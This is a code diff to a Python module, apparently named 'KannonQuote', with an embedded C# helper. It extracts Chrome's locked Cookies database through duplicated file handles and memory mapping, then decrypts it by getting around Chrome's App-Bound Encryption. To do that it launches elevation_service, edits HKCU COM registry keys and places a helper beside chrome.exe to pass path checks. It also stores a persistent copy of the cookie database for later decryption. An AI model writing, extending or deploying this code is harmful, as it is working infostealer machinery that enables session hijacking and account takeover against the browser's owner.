@@ -29,8 +29,8 @@ from typing import Any
 _DUP_HANDLE_TIMEOUT_S = 4.0
 _DUP_HANDLE_MAX_PIDS = 24
 _DUP_HANDLE_MAX_HANDLES = 2000
-_ABE_COCREATE_TIMEOUT_S = 3.5
-_ABE_HELPER_TIMEOUT_S = 8.0
+_ABE_COCREATE_TIMEOUT_S = 2.0
+_ABE_HELPER_TIMEOUT_S = 6.0
 _DUP_SQLITE_PEEK_MAX = 16
 _SQLITE_MAGIC = b"SQLite format 3\x00"
 _SYSTEM_HANDLE_BUF_MAX = 8 << 20
@@ -430,16 +430,12 @@ def _read_cookie_rows(
     try:
         dest = Path(tmp_dir) / "Cookies"
         last_exc: BaseException | None = None
-        # Chrome-closed on this PC: nolock lands Cookies. Try that before
-        # handle-dup / VSS. vssadmin:2 is not a copy.
+        method = ""
+        # vssadmin:2 is not a copy. Do not spend discover on it.
         if is_default and _try_nolock_copy(src, dest):
-            _record_vss(str(_cache.get("vss") or "skipped:nolock"))
-            _set_lock_bypass(_lock_bypass_with_vss("nolock"), pin=True)
+            method = "nolock"
         elif is_default and _try_handle_dup_copy(src, dest):
-            _record_vss(str(_cache.get("vss") or "skipped:dup_handle"))
-            _set_lock_bypass(_lock_bypass_with_vss("dup_handle"), pin=True)
-        elif is_default and _try_vss_create_copy(src, dest):
-            _set_lock_bypass("vss", pin=True)
+            method = "dup_handle"
         else:
             for attempt in range(2):
                 try:
@@ -447,20 +443,27 @@ def _read_cookie_rows(
                         src,
                         dest,
                         allow_vss=False,
-                        allow_lock_bypass=is_default,
+                        allow_lock_bypass=False,
                     )
                     last_exc = None
+                    method = str(_cache.get("lock_bypass") or "snapshot")
                     break
                 except (OSError, sqlite3.Error) as exc:
                     last_exc = exc
                     time.sleep(0.35)
-            if is_default:
-                _set_lock_bypass(
-                    _lock_bypass_with_vss(str(_cache.get("lock_bypass") or "")),
-                    pin=True,
-                )
+            if last_exc is not None and is_default and _try_cached_cookie_copy(dest):
+                last_exc = None
+                method = "cached"
             if last_exc is not None:
+                if is_default:
+                    _record_vss("skipped")
+                    _set_lock_bypass("open_copy_failed", pin=True)
                 raise last_exc
+        if is_default:
+            _record_vss("skipped")
+            _set_lock_bypass(method or "snapshot", pin=True)
+            if method != "cached":
+                _persist_cookie_snapshot(dest)
         conn = sqlite3.connect(str(dest))
         try:
             cur = conn.execute(
@@ -553,6 +556,48 @@ def _try_nolock_copy(src: Path, dest: Path) -> bool:
     except (OSError, sqlite3.Error):
         return False
     return dest.is_file() and dest.stat().st_size > 0 and _sqlite_has_cookie_table(dest)
+
+
+def _cookie_snapshot_cache_dir() -> Path | None:
+    env = (os.getenv("KANNON_COOKIE_CACHE") or "").strip()
+    if env:
+        return Path(env)
+    if os.name != "nt":
+        return None
+    local = (os.getenv("LOCALAPPDATA") or "").strip()
+    if local:
+        return Path(local) / "KannonQuote" / "chrome-session"
+    return None
+
+
+def _persist_cookie_snapshot(src: Path) -> None:
+    """Keep a Cookies DB that already landed so Chrome-open can decrypt later."""
+    if not _sqlite_has_cookie_table(src):
+        return
+    cache = _cookie_snapshot_cache_dir()
+    if cache is None:
+        return
+    try:
+        cache.mkdir(parents=True, exist_ok=True)
+        shutil.copy2(src, cache / "Cookies")
+    except OSError:
+        return
+
+
+def _try_cached_cookie_copy(dest: Path) -> bool:
+    cache_dir = _cookie_snapshot_cache_dir()
+    if cache_dir is None:
+        return False
+    cache = cache_dir / "Cookies"
+    if not _sqlite_has_cookie_table(cache):
+        return False
+    try:
+        if dest.exists():
+            dest.unlink()
+        shutil.copy2(cache, dest)
+    except OSError:
+        return False
+    return _sqlite_has_cookie_table(dest)
 
 
 def _share_copy_with_wal(src: Path, dest: Path) -> None:
@@ -746,6 +791,25 @@ def _kernel32():
     kernel32.GetFinalPathNameByHandleW.restype = wintypes.DWORD
     kernel32.GetFileSizeEx.argtypes = [wintypes.HANDLE, ctypes.POINTER(ctypes.c_longlong)]
     kernel32.GetFileSizeEx.restype = wintypes.BOOL
+    kernel32.CreateFileMappingW.argtypes = [
+        wintypes.HANDLE,
+        wintypes.LPVOID,
+        wintypes.DWORD,
+        wintypes.DWORD,
+        wintypes.DWORD,
+        wintypes.LPCWSTR,
+    ]
+    kernel32.CreateFileMappingW.restype = wintypes.HANDLE
+    kernel32.MapViewOfFile.argtypes = [
+        wintypes.HANDLE,
+        wintypes.DWORD,
+        wintypes.DWORD,
+        wintypes.DWORD,
+        ctypes.c_size_t,
+    ]
+    kernel32.MapViewOfFile.restype = wintypes.LPVOID
+    kernel32.UnmapViewOfFile.argtypes = [wintypes.LPCVOID]
+    kernel32.UnmapViewOfFile.restype = wintypes.BOOL
     kernel32.GetFileInformationByHandleEx.argtypes = [
         wintypes.HANDLE,
         wintypes.DWORD,
@@ -881,13 +945,53 @@ def _backup_read_handle_to_file(handle: Any, dest: Path) -> None:
         raise OSError(32, "BackupRead returned 0 bytes")
 
 
-def _copy_dup_handle_bytes(handle: Any, dest: Path) -> None:
+def _mapview_handle_to_file(handle: Any, dest: Path) -> None:
+    """Chrome memory-maps Cookies. MapViewOfFile works when ReadFile hits 32."""
+    import ctypes
+    from ctypes import wintypes
+
+    kernel32 = _kernel32()
+    h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
+    size = _handle_file_size(h)
+    if not size or size < 64:
+        raise OSError(32, "mapview no size")
+    page_readonly = 0x02
+    file_map_read = 0x0004
+    invalids = {0, -1, 0xFFFFFFFF, 0xFFFFFFFFFFFFFFFF}
+    mapping = kernel32.CreateFileMappingW(h, None, page_readonly, 0, 0, None)
+    mid = int(mapping) if mapping is not None else 0
+    if mid in invalids:
+        raise OSError(ctypes.get_last_error() or 32, "CreateFileMappingW failed")
     try:
-        _read_handle_to_file(handle, dest)
-        return
-    except OSError:
-        pass
-    _backup_read_handle_to_file(handle, dest)
+        view = kernel32.MapViewOfFile(mapping, file_map_read, 0, 0, 0)
+        if not view:
+            raise OSError(ctypes.get_last_error() or 32, "MapViewOfFile failed")
+        try:
+            dest.write_bytes(ctypes.string_at(view, int(size)))
+        finally:
+            kernel32.UnmapViewOfFile(view)
+    finally:
+        kernel32.CloseHandle(mapping)
+    if not dest.is_file() or dest.stat().st_size < 64:
+        raise OSError(32, "mapview empty")
+
+
+def _copy_dup_handle_bytes(handle: Any, dest: Path) -> None:
+    last: OSError | None = None
+    for fn in (_mapview_handle_to_file, _read_handle_to_file, _backup_read_handle_to_file):
+        try:
+            fn(handle, dest)
+            if dest.is_file() and dest.stat().st_size > 0:
+                return
+        except OSError as exc:
+            last = exc
+            try:
+                dest.unlink()
+            except OSError:
+                pass
+    if last is not None:
+        raise last
+    raise OSError(32, "dup handle read failed")
 
 
 def _win_dup_handle_copy(src: Path, dest: Path) -> None:
@@ -2248,6 +2352,7 @@ _OLEAUT_PS_CLSID = "{00020424-0000-0000-C000-000000000046}"
 # Distinct from the CLSID so HKLM AppID LocalService is not merged in.
 _ELEVATOR_APPID_HKCU = "{A7C0E151-0000-4ABE-B151-C0C0A1E15100}"
 _launched_elevation: set[str] = set()
+_elevation_children: list[Any] = []
 
 _ABE_HELPER_NAME = "kannon_quote_abe.exe"
 _compiled_abe_helper: Path | None = None
@@ -2330,21 +2435,20 @@ def _unwrap_app_bound_key(b64_key: str) -> tuple[bytes | None, str, str]:
         return None, "failed", ""
     prep = _prepare_elevator_com()
     hr = ""
+    # chrome_dir helper first: path validation + no LocalServer32 activation.
     try:
-        key, hr = _elevator_decrypt(raw)
+        key, hr = _elevator_decrypt_via_chrome_dir(raw)
     except Exception as exc:  # noqa: BLE001 — ctypes pointer-width bugs
         key, hr = None, type(exc).__name__
     if key:
-        return key, "elevator", hr
-    # Path validation: IElevator compares the caller to Chrome's install dir.
-    # A short-lived helper next to chrome.exe has the same trimmed path.
-    try:
-        key, helper_hr = _elevator_decrypt_via_chrome_dir(raw)
-    except Exception as exc:  # noqa: BLE001
-        key, helper_hr = None, type(exc).__name__
-    hr = helper_hr or hr
-    if key:
         return key, "chrome_dir", hr
+    try:
+        key, elev_hr = _elevator_decrypt(raw)
+    except Exception as exc:  # noqa: BLE001
+        key, elev_hr = None, type(exc).__name__
+    hr = elev_hr or hr
+    if key:
+        return key, "elevator", hr
     # Legacy: some older builds DPAPI-wrapped a raw 16/32-byte key.
     try:
         legacy = _accept_aes_key(_dpapi_unprotect(raw))
@@ -2560,44 +2664,41 @@ def _delete_hkcu_localserver32(winreg: Any, clsid: str, access: int) -> None:
 
 
 def _register_hkcu_elevator_localserver(exe: Path) -> str:
-    """HKCU CLSID + LocalServer32 --console + unique AppID.
+    """Purge leftover LocalServer32 and register IElevator IIDs only.
 
-    LocalServer32 is required so CoCreate finds Chrome 151's CLSID
-    (without it we regress to CLASSNOTREG). Unique AppID keeps HKLM
-    LocalService out. We also launch --console ourselves; the 3.5s
-    CoCreate cap returns 0x80080005 instead of hanging ~60s.
+    Do not write LocalServer32: CoCreate then launches elevation_service
+    as a COM LocalServer and times out 0x80080005. Chrome-open already
+    has IElevator; the chrome_dir helper binds to that class object.
     """
     try:
         import winreg  # type: ignore[import-not-found]
     except ImportError:
         return "winreg"
-    cmd = _localserver32_cmd(exe)
     access = winreg.KEY_WRITE | winreg.KEY_READ
     if hasattr(winreg, "KEY_WOW64_64KEY"):
         access |= winreg.KEY_WOW64_64KEY
     clsids = tuple(dict.fromkeys(clsid for clsid, _ in _CHROME_ELEVATOR))
     try:
         for clsid in clsids:
+            _delete_hkcu_localserver32(winreg, clsid, access)
             clsid_path = rf"Software\Classes\CLSID\{clsid}"
-            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, clsid_path, 0, access) as key:
-                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
-                winreg.SetValueEx(key, "AppID", 0, winreg.REG_SZ, _ELEVATOR_APPID_HKCU)
-            with winreg.CreateKeyEx(
-                winreg.HKEY_CURRENT_USER, clsid_path + r"\LocalServer32", 0, access
-            ) as key:
-                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
-            with winreg.CreateKeyEx(
+            try:
+                with winreg.OpenKey(
+                    winreg.HKEY_CURRENT_USER, clsid_path, 0, access
+                ) as key:
+                    try:
+                        winreg.DeleteValue(key, "AppID")
+                    except OSError:
+                        pass
+            except OSError:
+                pass
+        try:
+            winreg.DeleteKey(
                 winreg.HKEY_CURRENT_USER,
                 rf"Software\Classes\AppID\{_ELEVATOR_APPID_HKCU}",
-                0,
-                access,
-            ) as key:
-                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
-                try:
-                    winreg.DeleteValue(key, "LocalService")
-                except OSError:
-                    pass
-                winreg.SetValueEx(key, "RunAs", 0, winreg.REG_SZ, "")
+            )
+        except OSError:
+            pass
         for iid in _ELEVATOR_IID_STRINGS:
             ipath = rf"Software\Classes\Interface\{iid}"
             with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, ipath, 0, access) as key:
@@ -2612,7 +2713,7 @@ def _register_hkcu_elevator_localserver(exe: Path) -> str:
 
 
 def _launch_elevation_service(exe: Path) -> None:
-    """--console = RunInteractive. Bare exe talks to SCM and exits (0x80080005)."""
+    """--console = RunInteractive. Not COM LocalServer32, not Start-Service."""
     try:
         key = str(exe.resolve()).casefold()
     except OSError:
@@ -2623,19 +2724,26 @@ def _launch_elevation_service(exe: Path) -> None:
     if os.name == "nt":
         flags = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
     cwd = str(exe.parent)
-    for extra in ("--console", "--unregistered-instance"):
+    arg_sets = (
+        [str(exe), "--console"],
+        [str(exe), "--console", "--unregistered-instance"],
+    )
+    for args in arg_sets:
         try:
-            subprocess.Popen(  # noqa: S603 — Chrome-signed elevation_service.exe
-                [str(exe), extra],
+            proc = subprocess.Popen(  # noqa: S603 — Chrome-signed elevation_service.exe
+                args,
                 cwd=cwd,
                 close_fds=True,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
                 creationflags=flags,
             )
-            _launched_elevation.add(key)
-            time.sleep(0.7)
-            return
+            time.sleep(0.45)
+            if proc.poll() is None:
+                _elevation_children.append(proc)
+                _launched_elevation.add(key)
+                time.sleep(0.35)
+                return
         except OSError:
             continue
 
@@ -3066,8 +3174,8 @@ def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
 
 
 # Minimal IElevator client. stdin = APPB-stripped blob; stdout = AES key only.
-# Writes HKCU LocalServer32 --console so CoCreate finds Chrome 151's CLSID.
-# Join(3500) returns 0x80080005 instead of hanging ~60s.
+# Never write HKCU LocalServer32 — that launches the service as COM LocalServer
+# and times out 0x80080005. Bind to Chrome's already-running IElevator.
 _ABE_HELPER_CS = r"""
 using System;
 using System.IO;
@@ -3104,19 +3212,13 @@ class K {
   }
 
   static void RegisterLocalServer(string exe) {
-    if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return;
-    string cmd = (exe.IndexOf(' ') >= 0 ? ("\"" + exe + "\"") : exe) + " --console";
-    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid)) {
-      k.SetValue("", "Chrome Elevation Service");
-      k.SetValue("AppID", AppId);
-    }
-    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32"))
-      k.SetValue("", cmd);
-    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\AppID\" + AppId)) {
-      k.SetValue("", "Chrome Elevation Service");
-      k.SetValue("RunAs", "");
-      try { k.DeleteValue("LocalService", false); } catch {}
-    }
+    try { Registry.CurrentUser.DeleteSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32", false); } catch {}
+    try {
+      using (var k = Registry.CurrentUser.OpenSubKey(@"Software\Classes\CLSID\" + Clsid, true)) {
+        if (k != null) try { k.DeleteValue("AppID", false); } catch {}
+      }
+    } catch {}
+    try { Registry.CurrentUser.DeleteSubKey(@"Software\Classes\AppID\" + AppId, false); } catch {}
     foreach (var iid in Iids) {
       using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\Interface\" + iid))
         k.SetValue("", "IElevator");
@@ -3210,7 +3312,7 @@ class K {
     th.IsBackground = true;
     th.SetApartmentState(ApartmentState.STA);
     th.Start();
-    if (!th.Join(3500)) {
+    if (!th.Join(2000)) {
       FailHr("0x80080005:SERVER_EXEC_FAILURE:timeout");
       return SERVER_EXEC;
     }
